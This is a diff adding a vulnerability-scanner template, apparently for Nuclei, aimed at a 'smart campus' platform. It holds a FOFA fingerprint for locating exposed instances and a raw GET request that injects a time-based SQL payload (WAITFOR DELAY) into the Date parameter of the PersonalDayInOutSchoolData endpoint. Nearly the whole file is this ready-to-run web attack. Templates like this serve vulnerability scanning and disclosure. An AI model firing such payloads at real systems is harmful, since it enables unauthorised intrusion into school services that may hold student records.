@@ -1,0 +1,19 @@
+id: poc-iu67pu9muzv1rugm
+info:
+  name: 智慧平台PersonalDayInOutSchoolData存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iu67pu9muzv1rugm'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iu67pu9muzv1rugm
+    fofa: body="custom/blue/uimaker/easyui.css"
+http:
+- raw:
+  - GET /ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&AccountNo=1 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
